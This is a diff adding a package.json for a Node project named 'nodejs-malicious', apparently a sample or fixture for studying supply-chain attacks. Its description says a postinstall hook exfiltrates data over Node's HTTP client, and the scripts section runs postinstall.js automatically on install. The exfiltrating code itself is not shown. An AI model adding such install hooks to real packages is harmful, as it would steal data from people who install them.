@@ -1,0 +1,13 @@
+{
+  "name": "nodejs-malicious",
+  "version": "1.0.0",
+  "description": "Node app with a postinstall hook that exfiltrates data via node's own HTTP client",
+  "main": "app.js",
+  "scripts": {
+    "start": "node app.js",
+    "postinstall": "node postinstall.js"
+  },
+  "dependencies": {
+    "express": "^4.18.2"
+  }
+}
